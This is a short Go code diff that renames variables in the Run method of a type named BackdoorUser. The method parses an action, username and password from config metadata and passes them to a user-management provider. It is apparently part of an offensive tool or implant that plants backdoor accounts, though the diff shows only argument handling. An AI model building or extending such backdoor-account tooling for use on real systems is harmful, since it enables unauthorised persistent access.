@@ -16,19 +16,19 @@ func (p BackdoorUser) Run(ctx context.Context, config map[string]string) {
 		log.Println(err)
 		return
 	}
-	var action, uname, pwd string
+	var action, args_1, args_2 string
 	if metadata, ok := config["metadata"]; ok {
 		data := strings.Split(metadata, " ")
 		if len(data) >= 2 {
 			action = data[0]
-			uname = data[1]
+			args_1 = data[1]
 			if len(data) >= 3 {
-				pwd = data[2]
+				args_2 = data[2]
 			}
 		}
 	}
 
-	i.Providers.UserManagement(action, uname, pwd)
+	i.Providers.UserManagement(action, args_1, args_2)
 	// log.Println("[+] Done.")
 }
 
